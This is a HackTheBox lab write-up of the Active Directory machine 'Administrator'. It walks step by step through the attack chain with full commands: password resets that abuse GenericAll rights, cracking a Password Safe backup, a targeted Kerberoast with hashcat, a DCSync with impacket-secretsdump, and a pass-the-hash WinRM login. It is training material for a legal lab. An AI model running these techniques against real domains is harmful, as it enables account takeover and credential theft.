---
title: Hack the box - Administrator
date: 2025-01-05 16:21:00 +/-TTTT
categories: [Pentesting, HackTheBox]
tags: [hackthebox, medium, active-directory, password-cracking]     # TAG names should always be lowercase
---
Hey everyone, today I want to explore a medium machine on HTB called Administrator.
The main themes that persists throughout this box are AD privilege mismanagement abuse to gain increasingly privileged users, with some password cracking thrown into the mix.
This was a very strange release coming from HTB, as I've not seen OSCP-like boxes in a very long time, but I'll touch more on that in the conclusion.

Unlike many HTB boxes, we actually start out with credentials to the domain for a user account `olivia` with the password `ichliebedich` (sidenote, that translates to I love you in german, how nice of them!)

## Foothold

I started out by running a normal port scan `nmap -sV -T5 administrator.htb`:
```
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-04 21:45:35Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
```
At first glance this looks very normal apart from the FTP service that we should keep in mind for later.
While this box never required use of a user list as spraying is not apart of the solution, I did try it during the solve:
```
┌──(root㉿kali)-[~/htb/Machines/Medium/Administrator]
└─# netexec smb Administrator.htb -u Olivia -p ichliebedich --users | awk -F '               ' '{print $2}' > users.txt
...
```

I tried a couple things at first, spraying the password for other users, seeing if I can log into FTP, etc, but I soon remembered a small quirk of nmap when not scanning specific ports - it doesn't scan the WinRM port! Sure enough after a full nmap port scan (`nmap -p- -T5 Administrator.htb`), WinRM revealed itself and we can log in with our given user account to gain a shell.

```
┌──(root㉿kali)-[~/htb/Machines/Medium/Administrator]
└─# evil-winrm -i administrator.htb -u olivia -p ichliebedich                                                                                                                       
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\olivia\Documents> 
```

## Olivia -> Michael

Enumerating over the machine itself did not prove useful, there wasn't anything interesting I could access but even if I could the machine seemed very empty. Given that the machine is mostly empty and we know it's a domain, I assumed this is going to be an AD machine, so I booted up BloodHound and got to collecting some data.

This is a good interlude to introduce a tool I've scripted called `startsmb`, which really saves you the hastle of moving files to and from kali and a windows host, this tool can be found on my github in pentest utils but in essence, it creates an SMB instance and copies the command you need to add it, very convinient in this box as we'll be using it quite often.
![startsmbScript](/assets/image/2025-01-05/341188909-4ab7feaa-5e2b-440a-b111-2629bfd82646.png)

Now all we need to do is bring in sharphound, collect our data and move it back to our kali machine.
```
*Evil-WinRM* PS C:\Users\olivia> net use w: \\10.10.14.113\archer /user:kali kali
*Evil-WinRM* PS C:\Users\olivia> copy W:\SharpHound.exe .
*Evil-WinRM* PS C:\Users\olivia> .\SharpHound.exe -c all
*Evil-WinRM* PS C:\Users\olivia> copy 202* W:\
```

Now that we've gathered our data, we can check if Olivia has any special privileges, and sure enough when looking at first degree object control, it seems like Olivia has `GenericAll` rights over `MICHAEL@ADMINISTRATOR.HTB`, this right allows us to force change the target user's password, so let's get to doing that

```ps
PS C:\...> import-module .\PowerView.ps1

PS C:\...> $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
PS C:\...> Set-DomainUserPassword -Identity Michael -AccountPassword $UserPassword 
```

We can confirm this worked via netexec:
```
┌──(root㉿kali)-[~/htb/Machines/Medium/Administrator]
└─# netexec winrm administrator.htb -u michael -p 'Password123!'
WINRM       10.129.81.221   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.129.81.221   5985   DC               [+] administrator.htb\michael:Password123! (Pwn3d!)
```

## Michael -> Benjamin
Similarly to Olivia, Michael can log in with WinRM and when following the same steps to see what object control Michael has, the account can force change the password of `BENJAMIN@ADMINISTRATOR.HTB`

we'll follow the same steps as we did before, copy over PowerView, import it and use it to change the password of Benjamin:
```
*Evil-WinRM* PS C:\Users\michael\documents> net use w: \\10.10.14.113\archer /user:kali kali
The command completed successfully.
*Evil-WinRM* PS C:\Users\michael\documents> copy W:\PowerView.ps1 .
*Evil-WinRM* PS C:\Users\michael\documents> import-module .\PowerView.ps1

*Evil-WinRM* PS C:\Users\michael\documents> $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\michael\documents> Set-DomainUserPassword -Identity Benjamin -AccountPassword $UserPassword
```

## Benjamin -> Emily (User flag)
2 user pivots and no user flag! Well, we have to keep going.
Going over Benjamin we run into a pitstop, we cannot log into WinRM and the account doesn't seem to have any obvious dangerous privileges over other users.

When debating over what I should do I thought I should give FTP another try with the users I pwned, which ended up working for Benjamin (with our changed password of `Password123!`).
There I found a file `Backup.psafe3`
```
┌──(root㉿kali)-[~/htb/Machines/Medium/Administrator]
└─# ftp benjamin@administrator.htb 
Connected to administrator.htb.
220 Microsoft FTP Service
331 Password required
Password: Password123!
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||55541|)
125 Data connection already open; Transfer starting.
10-05-24  08:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> 
```
While I've never had the luxury of cracking a `psafe3` file, it follows a very similar path to a `kdbx` file, which I've cracked alot of. For `psafe3`, we can use `pwsafe2john` to get the hash of the file and crack it using `john`.

Small note: My kali runs on a VM therefore when cracking I always switch to my main rig, so cracking is done on windows, with `john` I find it simpler to use the GUI to crack.

John correctly identified the hash and I cracked it with `rockyou.txt`:
![CrackingPWSAFEHash](/assets/image/2025-01-05/image.png)

We get the passphrase of `tekieromucho`, which much like our olivia password, also means I love you but this time in spanish!

Anyways, now that we can open the backup file, we get a hit on Emily's password and can get a shell with WinRM and get the `user.txt` flag.

## Emily -> Ethan
Going back to BloodHound, this time we can see a clear path to victory using the Shortest Paths to DA from Owned Principles analysis:
![alt text](/assets/image/2025-01-05/image2.png)

Let's start with a `GenericWrite` privilege over the Ethan account. Contrary to what the name suggests, we cannot write over *any* property of Ethan (namely, force changing his password) but we can perform a targeted kerberoast to get his password hash and try to crack it.

we'll be using [this](https://github.com/ShutdownRepo/targetedKerberoast) tool with the suggested command from bloodhound:
```
┌──(root㉿kali)-[~/…/Machines/Medium/Administrator/targetedKerberoast]
└─# python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -f hashcat 

<...>
```

If you get a clock skew error, you have to manually set your time to match the machine:
```
┌──(root㉿kali)-[~/…/Machines/Medium/Administrator/targetedKerberoast]
└─# timedatectl set-ntp off     
┌──(root㉿kali)-[~/…/Machines/Medium/Administrator/targetedKerberoast]
└─# rdate -n administrator.htb
Sat Jan  4 18:25:08 EST 2025
```

After getting the hash, we can crack it using hashcat:
```
>hashcat -a 0 -m 13100 hashes\administrator.krb5.hash rockyou.txt
...
<hash>:limpbizkit
...
```
and of course confirm we successfully pwned the user!
![pwned ethan](/assets/image/2025-01-05/Pasted%20image%2020250104182816.png)

## Ethan -> Root
Alright, we're very close! A DCSync attack will net us the administrator NTLM hash which we can use to log in with WinRM!
To perform the attack we'll use `impacket-secretsdump` with the following command:
```
┌──(root㉿kali)-[~/…/Machines/Medium/Administrator/targetedKerberoast]
└─# impacket-secretsdump 'administrator.htb'/'ethan':'limpbizkit'@'administrator.htb'
...
Administrator:500:XXXXXXXXXXXXXXXXXX:XXXXXXXXXXXXX:::
...
```
We successfully get the NTLM hash of the administrator and we can now log in to the machine.
```
┌──(root㉿kali)-[~/…/Machines/Medium/Administrator/targetedKerberoast]
└─# evil-winrm -i administrator.htb -u administrator -H 'XXXXXXXXXXXX'

...

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> dir


    Directory: C:\Users\Administrator\desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---          1/4/2025   1:44 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
xxxxxxxxxxxxxxxxxxxxxxx
```

## Conclusion & Thoughts
This box is a very classic OSCP-Like box, it's clear and concise, I never felt lost and always saw the next step very clearly. This is a great box if you're new to AD and want to practice some classic AD privilege mismanagement. For me, this box felt a little too clear. I would've loved if there was some service I needed to exploit instead of resetting a password a second time to escalate to a different user or maybe an automated task run as Benjamin. The difficulty of the medium rating given to the machine is mostly in the number of steps, not the exploitation itself.

Though I must admit, sometimes HTB can be very difficult and obscure in it's exploitation paths so this box was definitely positively refreshing after pwning UnderPass!

More writeups will come in the future, hope you enjoyed your read!
